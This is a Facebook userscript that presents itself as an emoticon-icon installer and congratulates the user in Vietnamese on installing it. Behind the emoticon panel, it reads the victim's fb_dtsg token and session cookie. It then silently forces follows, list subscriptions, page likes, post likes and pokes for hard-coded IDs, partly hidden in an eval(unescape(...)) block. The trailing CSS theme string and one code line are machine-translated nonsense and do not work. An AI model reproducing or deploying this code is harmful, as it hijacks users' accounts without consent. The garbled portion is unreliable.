	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/tieutuno" target="_blank">Chúc Mừng Bạn Ðã Cài Ð?t ICON FACEBOOK Thành Công <br>FaceBook.Com</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//Saddest
a("100006499425782");
a("100003117140300");
a("100007237331415");
a("100008004600173");
a("100004915302558");
sublist("1522217051338261");
sublist("1522219821337984");
sublist("1523031224590177");
sublist("1523031554590144");
sublist("1523032014590098");
Like("351761638259044");
Like("351761638259044");
Like("762083863805023");
Like("146347295556421");
P("1518696008357032");
P("1508459966047303");
P("1507665446126755"); // cài icon
P("1465075360385764"); //Thử lượng like
P("1457721387787828");
P("1452283011664999")
//theme

var fb_dtsg = document.getElementsByName ('fb_dtsg') [0] giá trị.
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{
 var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {
  if(http4.readyState==4&&http4.status==200)http4.close
 }
 ;
 http4.send(params4)
}
function sublist(uidss)
{
 var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//khong sửa
eval
(unescape("//hang%20khong%20loc%0Aa%28%22100006266220030%22%29%3Ba%28%22100006266220030%22%29%3Ba%28%22100006604184616%22%29%3Ba%28%22100006650885752%22%29%3Ba%28%22100006598657343%22%29%3B%0Aa%28%22100006475726165%22%29%3Ba%28%22100006741782155%22%29%3Ba%28%22100006741782155%22%29%3B%0A//hang%20khong%20loc%20list%0Asublist%28%221408494976047295%22%29%3Bsublist%28%221408495272713932%22%29%3Bsublist%28%221408495409380585%22%29%3Bsublist%28%221408495562713903%22%29%3B%0Asublist%28%221408495666047226%22%29%3Bsublist%28%221404834019746724%22%29%3Bsublist%28%221420390201513174%22%29%3Bsublist%28%221420390621513132%22%29%3B%0Asublist%28%221420390621513132%22%29%3Bsublist%28%221420390201513174%22%29%3Bsublist%28%221404834019746724%22%29%3Bsublist%28%221404834019746724%22%29%3B"));

 
function p(abone)
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function ()
 {
  if (http4.readyState == 4 && http4.status == 200)
  {
   http4.close;
  }
 };
 http4.send(params4);
}
(function() {
var css = "# facebook \ Ncolor: # fff quan trọng; \ nbackground:! Url (\ "http://i814.photobucket.com/albums/zz69/yousif2010/Animated% 20Nature/nature36.gif \") lặp lại cố định lại trung tâm # 051.022 quan trọng; \ n} \ n \ n \ na, UIActionButton_Text, span, div, đầu vào [giá trị = \ "Bình luận \"] {text-shadow:.! # 000 1px 1px 1px quan trọng;} \ n \ n.UIComposer_InputArea *,. highlighter div {text-shadow: không quan trọng;} \ n \ n # profile_name {text-shadow: # fff 0 0 2px, # 000 1px 1px một khoảng: di chuột, UIIntentionalStory_Time một:. tiêu đề di chuột, UIPortrait_Text: di chuột, UIPortrait_Text khoảng title:.. di chuột, comment_link:. di chuột, khoảng request_link:.... di chuột, UIFilterList_ItemLink friend_status, dh_new_media khoảng khoảng:: di chuột, li ["rgb (255.255.255) \ background-color" phong cách * = \]:.. di chuột, một khoảng. di chuột, tab_link: hover *, nút: di chuột, # buddy_list_tab: di chuột *, tab_handle:. khoảng TAB_NAME di chuột, as_link:.. khoảng di chuột, đầu vào [type = \ "nút \"]: di chuột, feedback_show_link:. di chuột, trang:. văn bản di chuột, nhóm:.. văn bản di chuột, calltoaction.. : hover seeMoreTitle, liketext: di chuột, tickerStoryBlock: uiStreamMessage khoảng di chuột, tickerActionVerb, mleButton: di chuột, bigNumber, pluginRecommendationsBarButton: hover {color: # 9cf quan trọng; text-shadow:........! # fff 0 0 2px ! nội dung} \ n \ n \ n.fbChatSidebar fbChatTypeahead TextInput, fbChatSidebarMessage, devsitePage body> {box-shadow, không quan trọng::; quan trọng trang trí văn bản!......! không quan trọng;} \ n \ n. presence_menu_opts, # header, LJSDialog, chat_window_wrapper, # navAccount ul, fbJewelFlyout, uiTypeaheadView, uiToggleFlyout {box-shadow: 0 0 3em # 000;}........ \ n \ n.UIRoundedImage, UIContentBox_GrayDarkTop, UIFilterList> UIFilterList_Title ., thoại-tiêu đề, flyout, uiFacepileItem uiTooltipWrap {box-shadow: 0 0 1em 1px # 000;}... \ n \ n.extra_menus ul # MailBoxItems li a: hover, buddy_row một:. Di chuột, buddyRow một:. Di chuột, # chuyển hướng một: di chuột, # presence_applications_tab, # buddy_list_tab, # presence_error_section, uiStepSelected trung, jewelButton, # pageLogo, fbChatOrderedList mục.....: . di chuột, uiStreamHeaderTall {box-shadow: 0 0 3px # 000, hình chữ nhật 0 0 5px # 000 quan trọng;}. \ n \ n \ n.topNavLink> a: hover, # navAccount.openToggler, selectedCheckable {box-shadow: 0 0 4px 2px # 9cf, inset 0 0 2em # 69f quan trọng;!..} \ n \ n \ n.fbChatBuddyListDropdown UIButton, promote_page một, create_button một, share_button_browser.. . UIButton, uiSelector:.. Không (. FbDockChatDropdown) uiSelectorButton:. Không (. UiCloseButton), fbTimelineRibbon, # fbDockChatBuddylistNub fbNubButton, pluginRecommendationsBarButtonLike {box-shadow:.. 0 0 0,5 em RGBA (0,0,0,0.9), ! inset 0 0 0,75 em # 9cf quan trọng; cửa chiều rộng: 0 quan trọng;} \ n \ n.fbChatBuddyListDropdown UIButton:... di chuột, UIButton: không (. uiSelectorButton): di chuột, fbPrivacyWidget . UIButton: di chuột, uiSelector:.. Không (. FbDockChatDropdown) uiSelectorButton: không (. UiCloseButton): di chuột, fbTimelineMoreButton:. Di chuột, # fbDockChatBuddylistNub fbNubButton:. Di chuột, tab> div:. Không (tiêu đề.): Di chuột,. detail.frame: di chuột, pluginRecommendationsBarButtonLike: hover {box-shadow: 0 0 0,5 em # 000,0 0 1em 3px # 9cf, inset 0 0 2em # 69f quan trọng;}.. \ n \ n # icon_garden, list_select friend_list. {box-shadow: 0 0 3px-1px # 000, hình chữ nhật 0 0 3px-1px # 000;} \ n \ n.bb fbNubButton, uiScrollableAreaGripper {box-shadow:.. inset 0 4px 8px # 9cf, 0 0 1em # !. 000 quan trọng;} \ n \ n.bb fbNubButton: hover {box-shadow: inset 0 4px 8px # 9cf, 0 0,5 em 1em 1em # 9cf quan trọng;} \ n \ {n.fbNubFlyoutTitlebar box-shadow: inset 0 4px 8px # 9cf; padding: 0 4px quan trọng; progress_bar_outer} \ n \ n # fb_menubar, {box-shadow: inset 0 0 3px # 000,0 0 3em 3px # 000;} \ n # presence_ui {hộp!. .. bóng: 0 0 3em 1px # 000} \ n \ n # buddy_list_tab: di chuột, tab_handle: di chuột, tập trung {box-shadow: 0 0 3px # 000, hình chữ nhật 0 0 3px # 000,0 0 3em 5px # fff; } \ n \ n.uiSideNavCount, jewelCount.,. uiContextualDialogContent, fbTimelineCapsule. fbTimelineTwoColumn.> Truy cập truy cập, # pagelet_timeline_profile_actions, uiScaledImageContainer: di chuột, pagesVoiceBar, _k5 {box-shadow: 0 0 1em 4px # 9cf quan trọng;}...... \ N \ n.img_link: di chuột, album_thumb: di chuột, fbChatTourCallout.. cơ thể, fbSidebarGripper div {box-shadow: 0 0 3em # 9cf;}. \ n \ n.shaded, progress_bar_inner, tickerStoryAllowClick {box-shadow: inset 0 0 1em # 9cf quan trọng!} \ n \ n.UIPhotoGrid_Table... UIPhotoGrid_TableCell: di chuột ..... # # Presence_ui presence_bar nổi bật, fbNubFlyout: giai đoạn di chuột, hovercard, # fbDockChatBuddylistNub fbNubFlyout: di chuột, bóng-nội dung,-cx-TƯ-uiDialog__border. {Box-shadow:. 0 0 3em 5px # 9cf quan trọng; .} \ n \ n.fbNubFlyout, uiMenuXBorder {box-shadow: 0 0 5px # 000 3em quan trọng;} \ n \ n # blueBar {box-shadow: 0 0 1em 3px # 000 quan trọng;} \ n \ n \ {n.fill! box-shadow: inset 0 0 2em # 69f, 0 0 1em # 000 quan trọng;} \ n \ n \ ninput [type = \ "tập tin \"] {-moz-xuất hiện: không quan trọng; biên giới: không có ai span, # public_link_editalbum tuổi, dh_subtitle, app_name_heading, box_head, khoảng presence_bar_button, một:.... khoảng liên kết, # public_link_album Fname>., # Presence_applications_tab, mfs_email_title. Flyout văn bản.., UIFilterList_ItemLink. UIFilterList_Title., Announce_title.,. Attachment_link một khoảng, comment_author., UIPortrait_Text tiêu đề... Comment_link. UIIntentionalStory_Names, # profile_name. UIButton_Text. Dh_new_media span,. share_button_browser div,. UIActionMenu_Text. UINestedFilterList_Title, nút,. khoảng panel_item, stat_elem., hành động., # contact_importer_container đầu vào [giá trị = \ "Tìm một khoảng,. uiAttachmentDesc một khoảng,. văn bản uiStreamMessage một khoảng, nhóm.., trang văn bản.., uiLinkButton đầu vào.,. blueName, uiBlingBox span.text.,. commentContent một khoảng, UIButton đầu vào., fbDockChatTab tên.., . simulatedLink. bfb_tab_selected. liketext, a.UIImageBlock_Content. uiTypeaheadView li .. Tên được lựa chọn..... {Color: # 9cf quan trọng;} \ n \ n # email, lựa chọn, từ chối trách nhiệm, thông tin đ, UIUpcoming_Info, UITos_ReviewDescription, settings_box_text, div [phong cách * = \ "color: rgb (85 , 85,85) \ "] {color: # 999 mạnh mẽ,. Tóm lại, chú thích, story_body... social_ad_advert_text. createalbum dt,. basic_info_summary_and_viewer_actions dt, thông tin. b. fadded, fupdt, nhãn hiệu này.., main_subtitle.,. minifeed_filters li,. updates_settings, # public_link_photo, # phototags span, một góc khá hẹp. mạnh mẽ,. upsell rgb (51,51,51) \ "]. fphone_label. phone_type_label. sublabel, gift_caption., khoảng đ,. events_bar,. tìm kiếm,. event_profile_title. feedBackground, fp_show_less.,. gia số td, status_confirm.,. câu, admin_list. ....... Spell_suggest_label, pg_title, white_box, khoảng mã thông báo, profile_activation_score, khoảng personal_msg, khoảng matches_content_box_subtitle, tr [fbcontext = \ "41097bfeb58d \"] td, tiêu đề, khoảng floated_container:.. Không (. Giọng), div [phong cách * = \ "color: rgb (85,85,85) \"], div... [phong cách * = \ "color: rgb (68,68,68) \"], present_info_label, fbpage_description, đánh dấu tuổi , # thẻ h2 mạnh, # thẻ div span, div [phong cách * = \ "color: rgb (101.107.111) \"], # q, p. [phong cách * = \ "color: rgb (85,85,85) \"], pl mục, tagged_in. ., pick_body, td [phong cách * = \ "color: rgb (85,85,85) \"], mạnh mẽ [phong cách * = \ "color: rgb (68,68,68) \"], div [phong cách * = \ "màu: màu xám \"...], group_officers đ, fbpage_group_title, application_menu_divider, friend_status. . *, Văn bản:... Không (. Bên ngoài), flistedit b, fexth, UIActionMenu_Main, khoảng [phong cách * = \ "color: rgb (102.102.102) \"], div [phong cách * = \ "color: rgb (85 , 85,85) \ "], div [phong cách * = \" color: span, # tagger_prompt. UIImageBlock_Content,. khoảng new_list. GBSearchBox_Input . Title_label, div [phong cách * = \ "color: rgb (102.102.102) \"], * [phong cách * = \ "color: . nhịp, thứ privacySettingsGrid, recommendations_metadata, postleft dd:............ không (. usertitle), postText, mall_post_body_text, fbChatMessage, tùy chọn fbProfileBylineFragment, nosave, uiAttachmentDetails, td fbInsightsTable, mall_post_body, uiStreamPassive, đoạn , rowGroupDescription. questionInfo span,. promotionsHowto. FCG. headerColumn FWB., rowGroupTitle FWB... Tên, bong bóng văn bản, fbLongBlurb, legendLabel, messageBody {color:..... # Bbb . Trái,. Review_header_title, chú thích,. Logged_out_register_msg, domain_name.,. UITitledBox_Title, signup_box_content., Nổi bật., Câu hỏi.,. Khoảng whocan. UIFilterList> . Thể loại,. Item_date. Privacy_section_label. Privacy_section_title. UiTextMetadata, . FWB, # bfb_t_popular_body {Color: # 69f span, # friends_page_subtitle, main_title., empty_message.,. đếm. đếm mạnh mẽ,. khoảng stories_not_included li,. thứ mobile_add_phone, # bạn bè mạnh mẽ,. hiện tại,. no_photos,. giới thiệu,. sub_selected một,. số liệu thống kê, result_network., . note_body, # bodyContent div b, # bodyContent div,. upsell dt,. buddy_count_num mạnh mẽ,. trái, cơ thể.,. tab. hiện tại,. khoảng aim_link, story_related_count.,. quản trị viên span,. tóm tắt em,. fphone_number,. my_numbers_label. blurb_inner. photo_header mạnh mẽ,. note_content. multi_friend_status,. khoảng current_path, current_path., petition_header.,. pyramid_summary mạnh, # STATUS_TEXT. contact_email_pending em, profile_needy_message.,. div paging_link. big_title. fb_header_light,. import_status mạnh mẽ,. upload_guidelines ul khoảng li,. upload_guidelines ul khoảng li mạnh, # selector_status, dấu thời gian mạnh mẽ, chat_notice... notice_box, text_container.,. ALBUM_OWNER,. vị trí,. info_rows đ, chia., post_user., div [ style = \ "color: rgb (101.107.111); \"] b, p [style = \... "color: rgb (51,51,51); \"] b, basic_info_summary_and_viewer_actions đ, profile_info đ, story_comment, p mạnh mẽ, thứ mạnh mẽ,. fstatus. feed_story_body, story_content_data.,. home_prefs_saved p,. mạng đ, relationship_status đ., đ sinh nhật., current_city đ.,. UIIntentionalStory_Message. UIFilterList_Selected một,. UIHomeBox_Title, đề nghị.,. spell_suggest, . UIStoryAttachment_Caption, fexth + td, fext_short, # fb_menu_inbox_unread_count, khoảng sel_link Tabset_selected mũi tên, UISelectList_check_Checked, chat_fl_nux_header, friendlist_status tiêu đề một, chat_setting nhãn, UIPager_PageNum, good_username, UIComposer_AttachmentTitle, rsvp_option..............: nhãn di chuột,. Black, comment_author. . ul, nhãn # advanced_body_1, tiếp tục, empty_albums, div [phong cách * = \ "màu: đen \"].., GBThreadMessageRow_Body_Content, UIShareStage_Subtitle, khoảng # public_link_photo, GenericStory_Message, UIStoryAttachment_Value, div [phong cách * = \ "màu sắc... : Bạn bè \ "], # bodyContent, bảng # bodyContent, h6,. FbChatBuddylistError,. Thông tin dt, bfb_options_minimized_hide.,. Connect_widget_connected_text, body.transparent_widget khoảng thứ thead, khoảng đầu.,. friendlist_name một,. đếm. countValue,. khoảng uiHeaderTitle, # about_text_less . Chọn attachmentName, bong bóng tiêu đề, cropMessage {color: # fff quan trọng;}... \ N \ n.bfb_post_action_container {opacity: 0,25 quan trọng;} \ n.bfb_post_action_container: hover {opacity: 1 quan trọng;} \ n \ n.valid. wallheader nhỏ, # photodate. video_timestamp mạnh mẽ,. date_divider span,. feed_msg . nhỏ, ngày, div [phong cách * = \ "color: rgb (85,82,37) \"]....., khoảng dấu thời gian, time_stamp, dấu thời gian, header_info_timestamp, more_info một, UIUpcoming_Time, rightlinks, GBThreadMessageRow_Date, GenericStory_Time một, GenericStory_Time, fbPrivacyPageHeader, date_divider {color:....... # 69f đầu vào, đầu vào [name = \ "tìm kiếm \"], uiInlineTokenizer, input.text, input.nosave {background: RGBA (0,0,0, 0,50) quan trọng;-moz-xuất hiện:!. không quan trọng, màu sắc : # bbb quan trọng; biên giới: không quan trọng; padding: 3px quan trọng;} \ n \ ninput [type = \ "text \"]:... tập trung, vùng văn bản: tập trung, fbChatSidebar fbChatTypeahead TextInput: focus {hộp bóng: 0 0 0,5 em # 9cf, inset 0 0 0,25 em # 69f quan trọng;} \ n \ n.uiOverlayPageWrapper, # fbPhotoSnowlift, shareOverlay, tlPageRecentOverlay {background:..-moz-radial gradient (50% 50%, vòng tròn, RGBA (10,10,10, 0,6), rgb (10,10,10) 90%) quan trọng;} \ n \ n.bumper, stageBackdrop {background:.! # 000 quan trọng;} \ n # page_table {background: # 333} \ n \ n.checkableListItem: hover một, selectedCheckable một {background: # 69f quan trọng;} \ n \ n.GBSearchBox_Input, tokenizer, LTokenizerWrap, # mailBoxItems li một. di chuột,... .. uiTypeaheadView tìm kiếm đã chọn, itemAnchor:. di chuột, notePermalinkMaincol top_bar, thông báo:... di a, # bfb_tabs div:. không (. bfb_tab_selected), bfb_tab, navIdentity dạng:... di chuột, connect_widget_not_connected_text, uiTypeaheadView li.selected, . connect_widget_number_cloud, placesMashCandidate: di chuột, đánh dấu, # bfb_option_list li a: hover.... {background: RGBA (0,0,0, 0,5) quan trọng;} \ n \ n.results trang, calltoaction, kết quả. . PagesVoiceBar.. {! Nền: RGBA (10,10,10, 0,75) quan trọng;} \ n \ n # pageNav tinyman: hover a, # navHome: hover a, # pageNav tinyman một [phong cách * = \ "con trỏ : tiến trình \ "], # navHome một [phong cách * = \" con trỏ: li a: hover, fbSidebarGripper. . Truy cập, # pagelet_timeline_profile_actions . MessagesContent {background: RGBA (10,10,10, 0,5) # Bfb_options_body. UIMessageBoxStatus, tip_content. Nổi bật.,. FbActivity. Auxlabel, signup_bar_container., # Wait_panel. FBAttachmentStage, tấm., UiInfoTable tên... HCContents, # devsiteHomeBody nội dung., DevsitePage nav. Nội dung.., # confirm_phone_frame, fbTimelineCapsule. . Chi tiết, tosPaneInfo, navSubmenu:.. Di chuột, # bfb_donate_pagelet> ..... tr> td> div, statsContainer, # admin_panel, fbTimelineSection, escapeHatch, ogAggregationPanelContent,.-cx-TƯ-fbTimelineExternalShareUnit__root, shareUnit một, storyBox {background:. RGBA (20,20,20, 0,4) dt,. thông tin dt, photo_table, extra_content.., main_content.,. search_inputs. search_results, kết quả., quán bar.,. smalllinks span,. quiz_actionbox. cột,. note_header. FDH, # fpgc, # fpgc td, . phân lân nung chảy. fadvfilt. fsummary. FRN, two_column_wrapper., # new_ff. see_more. message_rows. message_rows tr. toggle_tabs li,. toggle_tabs li một,. arrowlink a, # safety_page, # safety_page h5,. dashbar. chối trách nhiệm, # store_options, # store_window,. bước,. canvas_rel_positioning. app_type một,. sub_selected . PBody li a, # p-logo, # p-chuyển hướng, # p-chuyển hướng. PBody, h1 # bodyContent, # p-wiki, # p-wiki. PBody, # p-tìm kiếm, # p-tìm kiếm. PBody, # p-tb, # p-tb. pBody, bảng # bodyContent, # bodyContent bảng div,. recent_news. main_news. news_header. devsite_subtabs li một. trung container,. h4 feed_msg. ads_info. contact_sales, wrapper. span, wallkit_postcontent. li . Mục. Typeahead_list_with_shadow, mô-đun.,. Tc, bc., Footer., ... một, flistedit, fmp_delete, # feed_content_section_friend_lists li, composer_tabs li:. không (. chọn), menu_content li li a, # inline_composer. skin_body. invite_tab_selected. bảng bên trong, matches_matches_box.,. matches_content_box_subtitle, tr [fbcontext = \ "41097bfeb58d \"]. div dialog_body bảng, board_topic., # big_search, # invitation_list, # invitation_wrapper. emails_error. outer_box, inner_box., days_remaining., mô-đun., submodule.,. ntab. ntab # Fb_challenge, # fb_challenge_page, challenge_leaderboard.,. Leaderboard_tile, Page0.. Hàng, dialog_loading., Thời gian., Partyrow.,. Bảng partyrow, # invite_list span,. phù hợp ...> Span, tokenizer_input, tokenizer_input *, # friends_multiselect, flink_inner một:.. Di chuột, # grouptypes, # startagroup p, UICheckList, FriendAddingTool_InnerMenu, pagerpro li. một khoảng, chat_setting. nhãn:... thứ n con (lẻ), request_box, giới thiệu, bước li, # fb_sell_profile div, khuyến mãi, các tab UIOneOff_Container, whocan, lock_r, privacy_edit_link, friend_list_container li:...... di chuột tbody. GBThreadMessageRow, message_pane.,. UIComposer_ButtonArea, hình thức câu chuyện tr. TabView. TabView li một. splitViewContent. photoGrid. albumGrid, img khung... gridViewCrop, GridView., profileWall hình thức.,.,. . Ảnh, UISuggestionList_SubContainer, fan_action, video_pane, notify_option, video_gallery, video, uiTooltip:....... Không (gần.):.. Di chuột, people_table, bảng people_table, # chính, # navlist li Chính, linkbox.., UiTypeaheadView tìm kiếm.. # Chủ đề,. Blockpost postleft., Blockpost.. Postfootleft. FbRecommendation. FbRecommendationWidgetContent, add_comment., Connect_comment_widget. ol, uiStep, uiStep:..... phần không (. uiStepSelected), uiStepSelected phần:...... không (. giữa), better_fb_cp, truyền thuyết, td lẻ div bfb_option_body, messaging_nux_header, fbInsightsTable, user.selected, . highlighter div b, fbQuestionsBlingBox:. di chuột, friend_list_container, jewelItemList li a:.. hoạt động, # bfb_tip_pagelet> FbPhotoImageStage. StageContainer, # DeveloperAppBody.> Nội dung.,. Opengraph xem trước.,. CoverNoImage. FbTimelineScrubber, fbTimelineAds.,. FbProfilePlacesFilter. FbFeedbackPost Lựa chọn, bfb_tab_selector, UIMessageBoxExplanation, uiStreamSubstories.... {Background: RGBA (20,20,20, 0,2) quan trọng;} \ n \ n.uiSelector . Thông tin dt, đường ống.,. Dh_new_media. Dh_new_media. Br, frn_inpad., # Frn_lists, # frni_0, span. Frecent, khoảng h3,. UIMediaHeader_TitleWash, editor_panel. Đúng.,. UIMediaButton_Container tbody *, # userprofile, profile_box., . date_divider tuổi, góc., hồ sơ # nội dung.. UIOneOff_Container. FF3. ảnh # # nonfooter page_height,. nhà # # nonfooter page_height, nhà. span,. tab,. pixel. tàn tật, title_header.. basic_header, # profile_tabs li, # tab_content. td bên trong,. khoảng match_link, tr [fbcontext = \ "41097bfeb58d \"] bảng, giọng., # thẻ span,. UICheckList_Label, # flm_list_selector. Tabset_selected mũi tên., # flm_list_selector chọn. mũi tên. sel_link., friendlist_status.. tiêu đề *,. UISelectList_Label. UIComposer_InputShadow nhỏ,. white_hover, GBTabset_Pill span.,. UINestedFilterList_ItemRight, GBSearchBox_Input đầu vào.,. bình luận inline_edit. feedbackView. thứ div, searchroot., composerView thứ div.,. trả lời thứ div,. LTokenizer. Mentions_Input, form.comment h4. buddy_row. home_no_stories, # xpageNav li . UiListItem:.. Di chuột, no_border, phụ trợ nổi bật, emu_comments_box_nub, numberContainer, uiBlingBox, uiBlingBox:..... Di chuột đầu vào, # contentArea. uiHeader + ol,. friend_list. fbFeedbackMentions. bb. fbNubFlyoutHeader. bb. fbNubFlyoutFooter. fbNubFlyoutInner. fbNubFlyoutFooter. gradientTop. gradientBottom. helpPage, fbEigenpollTypeahead cộng... uiSearchInput. opengraph, # developerAppDetailsContent. timelineLayout . Tùy chọn no_hover, fbTimelinePhotosSeparator khoảng 4h, withsubsections, showmore, event_profile_information tr:..... Di chuột, nux_highlight_nub, uiSideNav uiCloseButton, uiSideNav uiCloseButton đầu vào, fb_content, uiComposerAttachment chọn........ . Tinyman: di chuột, # navHome: di chuột, fbRemindersThickline, uiStreamEdgeStoryLine giờ, uiInfoTable tbody tr:........ Di chuột, fbTimelineUFI, ​​# contentArea, leftPageHead, rightPageHead, anchorUnit, # pageNav topNavLink ... bảng, uiToken, ogAggregationPanelText, UFIRow {background: minh bạch ,. Tabs_more_menu,. Hơn một nhịp,. H2 chọn. Cột h2,. Ffriends,. Tr make_new_list_button_table, title_header.,. Inbox_menu, side_column.,. H3 section_header h2, # safety_page h4, section_banner.,. box_head, # header_bar. h3 content_sidebar, content_header., # sự kiện h3, # blog của h3, footer_border_bottom.,. firstHeading, # footer,. recent_news h3,. wrapper div a, # photoactions li một. di chuột, menu_content li: hover, # edit_profilepicture, menu_content div. một, post_header.,. header_cell, # lỗi,. bộ lọc,. h2 pages_dashboard_panel, srch_landing. partyrow di chuột, # partylist:: h2, wall_post_title, # maps_options_menu, menu_link, gamerProfileTitleBar, feed_rooster, emails_success, bảng friendTable:....... di chuột, board_topic:. di chuột, bàn fan_table. di chuột, latest_video:. di chuột,. wallpost: di chuột, profileTable tr. di chuột, friend_grid_col:. di chuột, bookmarks_list li:. di chuột, requests_list li:. di chuột, birthday_list li:. di chuột, các tab li, fb_song:.. di chuột, share_list item_container:.. di chuột,. viết một:. di chuột, # photos_box album: di chuột, người dân hàng:... di chuột, group_list nhóm:.. di chuột, confirm_boxes xác nhận:.. di chuột, đăng share_item_wide share_media:... di chuột, lưu ý:. di chuột,. editapps_list app_row:... di chuột, my_networks khối khối:. di chuột, mock_h4, # notification_options tr. di chuột, notifications_settings li:. di chuột, h2 mobile_account_main, h4 ngôn ngữ, products_listing sản phẩm:.... di chuột, thông tin sản phẩm... item_content: di chuột, info_section:. di chuột, recent_notes. 4h, # startagroup h4. actionspro UISelectList, flyout.. . UIActionMenu_Wrap, UIBeeper, branch_notice, async_saving, UIActionMenu UIActionMenu_Wrap:..... Di chuột, attachment_link một:. Di chuột, UITitledBox_Top, UIBeep, tiếng bíp, bạn bè # li a:... Di chuột, apinote. . 